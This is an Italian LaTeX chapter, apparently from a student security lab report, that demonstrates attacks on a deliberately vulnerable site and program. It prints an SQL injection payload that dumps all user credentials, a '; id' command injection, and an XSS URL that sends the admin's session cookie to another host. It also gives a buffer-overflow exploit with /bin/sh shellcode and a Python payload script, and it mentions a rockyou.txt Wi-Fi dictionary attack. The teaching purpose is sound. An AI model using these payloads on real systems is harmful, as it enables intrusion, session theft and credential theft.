% Secondo capitolo
\subsection{SQL Injection}
L'\textbf{SQL Injection} (SQLI) è una tecnica di code injection utilizzata per attaccare applicazioni o servizi basati su database relazionali. Con questo tipo di attacco si possono estrarre da un database diversi tipi di informazioni sensibili, come ad esempio i dati personali di tutti gli utenti oppure i dati per l'autenticazione al sistema che si sta attaccando.

Nel nostro progetto l'SQLi è usata per due funzioni: la prima per accedere come amministratore, la seconda per estrarre le credenziali, sia username che hash di password, di tutti gli utenti registrati nel sito.

Ora analizzeremo come vengono realizzate le due funzioni appena descritte: per prima cosa, in entrambi gli attacchi si deve entrare nella pagina di login del nostro sito (Fig. \ref{fig:home}).

\begin{figure}[H]
	\centering
	\includegraphics[width=\textwidth]{foto/site-home.png}
	\caption{Home page del sito.}
	\label{fig:home}
\end{figure}

Per ottenere i diritti da amministratore del sito web, basta conoscere l'username che utilizza per l'autenticazione l'amministratore aggiungendo solamente tre caratteri del linguaggio SQL con cui di norma si scrivono le query. In particolare la query che viene inviata al database per autenticare un utente è la seguente:

\begin{lstlisting}
SELECT * 
FROM users 
WHERE (username LIKE '$username') AND (password = '$password)
\end{lstlisting}

\begin{figure}[H]
	\centering
	\includegraphics[width=\textwidth]{foto/login-page-admin.png}
	\caption{SQLI per diventare admin.}
	\label{fig:admin-login}
\end{figure}

La query viene modificata con i caratteri che in figura (Fig. \ref{fig:admin-login}) sono evidenziati in rosso, in quanto la modificano in questa:

\begin{lstlisting}
SELECT * 
FROM users 
WHERE (username LIKE 'admin')
\end{lstlisting}

Ciò è possibile poiché l'ultimo carattere inserito nel form dedicato all'inserimento dell'username commenta la parte successiva della query, raggirando il controllo sulla password.

La seconda vulnerabilità che si può sfruttare nel sito,sempre tramite SQLi, permette di ottenere tutti i dati presenti nel database, in particolare quelli utilizzati dagli utenti per l'autenticazione.

Per eseguire questo attacco, bisogna essere all'interno della propria dashboard, che viene aperta dopo una corretta autenticazione (Fig. \ref{fig:dashboard-john-no-query}).

\begin{figure}[H]
	\centering
	\includegraphics[width=\textwidth]{foto/dashboard-john-no-query.png}
	\caption{Dashboard dell'utente.}
	\label{fig:dashboard-john-no-query}
\end{figure}

Poi si inserisce nel form di ricerca la seguente stringa:

\begin{lstlisting}
' OR 1=1 UNION ALL SELECT 1,2,CONCAT (username, " ", password) FROM users#
\end{lstlisting}

Questi caratteri vanno a modificare la query per la ricerca:

\begin{lstlisting}
SELECT * 
FROM stranger_things 
WHERE thing = '' OR 1=1 UNION ALL SELECT 1,2,
	CONCAT (username, " ", password)
	FROM users#
\end{lstlisting}

Il risultato della query restituirà l'intera tabella users.

\subsection{Remote Code Execution - (RCE)}

La Remote Code Execution permette di eseguire un qualsiasi comando di sistema così da permettere all'attaccante di avere un controllo completo sulla macchina.

Nel progetto, questa vulnerabilità è stata implementata in una form di ricerca presente nella dashboard, nella Fig. \ref{fig:rce-commandw} è evidenziata dal rettangolo rosso.

\begin{figure}[H]
	\centering
	\includegraphics[width=\textwidth]{foto/rce-command.png}
	\caption{Form per eseguire la vulenrabilit\`a RCE.}
	\label{fig:rce-commandw}
\end{figure}

Una volta che viene inserito un comando anteceduto da un "\texttt{;}", il server eseguirà innanzitutto il comando di listing dei file, e successivamente quello passato in input. Infatti in Unix il carattere "\texttt{;}" separa comandi differenti che vengono eseguiti sequenzialmente. In figura (Fig. \ref{fig:rce-result}) è possibile vedere l'esecuzione del comando \texttt{id} in seguito all'immissione nel form di input della stringa \texttt{; id}.

\begin{figure}[H]
	\centering
	\includegraphics[width=\textwidth]{foto/rce-result.png}
	\caption{Risultato del comando \textit{; id}.}
	\label{fig:rce-result}
\end{figure} 

\subsection{Cross-Site Scripting - (XSS)}

La vulerabilità \textbf{XSS} colpisce i siti web dinamici che non eseguono sufficienti controlli nelle form di input. Infatti l'XSS va a modificare direttamente l'HTML di una pagina web eseguendo del codice lato client così da poter raccogliere, manipolare, reindirizzare e modificare i dati degli utenti, come ad esempio i cookie. Nel nostro esempio, il parametro della barra di ricerca viene passato tramite metodo GET al server web; utilizzando quindi la stringa \texttt{http://192.168.1.1/admin/?search=<script>window.location=} \\ 
\texttt{'http://192.168.1.2/?cookie='+document.cookie</script>\&submit=search} e inviandola all'amministratore, è stato possibile ottenere il suo \texttt{PHPSESSID}, ovvero il cookie di sessione dell'utente. In questo modo, sostituendo il nostro cookie con quello dell'admin è stato possibile loggare all'interno della dashboard senza conoscere username e password. Nell'immagine sottostante è possibile notare come venga stampato a schermo il cookie di sessione dell'admin sfruttando l'XSS:

\begin{figure}[H]
	\centering
	\includegraphics[width=\textwidth]{foto/XSS.png}
	\caption{Home page del sito.}
	\label{fig:home}
\end{figure}

\subsection{Buffer Overflow}
In sicurezza informatica, un buffer overflow è un'anomalia in cui un programma, mentre scrive i dati su un buffer, scavalca il limite del buffer stesso e sovrascrive le posizioni di memoria adiacenti.

I buffer sono aree di memoria messe da parte per contenere i dati, spesso mentre vengono spostati da una sezione di un programma ad un'altra o tra programmi. I buffer overflow possono spesso essere innescati da input malformati, se si presuppone che tutti gli input siano inferiori ad una determinata dimensione e il buffer viene creato per essere di tale dimensione, allora un input anomalo che contiene più dati rispetto al buffer allocato, potrebbe causarne la scrittura oltre la sua fine. Se questo sovrascrive i dati adiacenti o il codice eseguibile, ciò potrebbe causare un comportamento irregolare del programma, inclusi errori di accesso alla memoria, risultati errati e arresti anomali.

Sfruttare il comportamento di un buffer overflow è un noto exploit di sicurezza. Inviando dati malformati, è possibile scrivere in aree note di memoria per eseguire del codice arbitrario. I buffer sono diffusi nel codice del sistema operativo, quindi è possibile effettuare attacchi che eseguono l'escalation dei privilegi e ottenere accesso illimitato alle risorse del computer.

Passiamo ora ad analizzare il codice del programma vulnerabile a buffer overflow:

\begin{lstlisting}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
\end{lstlisting}

Il programma è stato compilato senza protezioni e utilizza la versione vulnerabile \texttt{gets()}. Per sfruttare questa vulnerabilità è stato innanzitutto riempito il buffer con 72 caratteri \texttt{A} e 6 \texttt{B} in modo tale da sovrascrivere l'EIP. Successivamente è stata inserita la shellcode \verb|\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f|\\
\verb|\x52\x57\x54\x5e\x0f\x05| che esegue \texttt{/bin/sh}. Tramite il debugger \texttt{gdb} è stato trovato l'indirizzo di memoria della shellcode che è risultato essere \texttt{0x7fffffffe110}; a questo punto è stato scritto il payload in python e dato in pasto al programma ottenendo così una shell:

\begin{lstlisting}
#!/usr/bin/env python
from struct import *

buf = ""
buf += "A"*72
buf += pack("Q", 0x7fffffffe110)
buf += "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"

print buf
\end{lstlisting}

\subsection{Dictionary Attack}

Un \textbf{dictionary attack} \`e una tecnica che permette di attaccare un sistema \textit{rompendo} un codice cifrato. Di solito, il dictionary attack, prende di mira le password che proteggono dati sensibili all'interno di un sistema. Per trovare la password corretta, solitamente si utilizzano tecniche a \textit{brute-force}, cio\`e si provano tutte le combinazioni possibili presenti su uno o pi\`u dizionari. I dizionari, sono dei file di testo con delle stringhe dentro.

Nel progetto, questo tipo di attacco \`e stato utilizzato per riuscire a connettersi ad una rete Wi-Fi senza conoscerne la password utilizzando il dictionary \textit{rockyou.txt}. 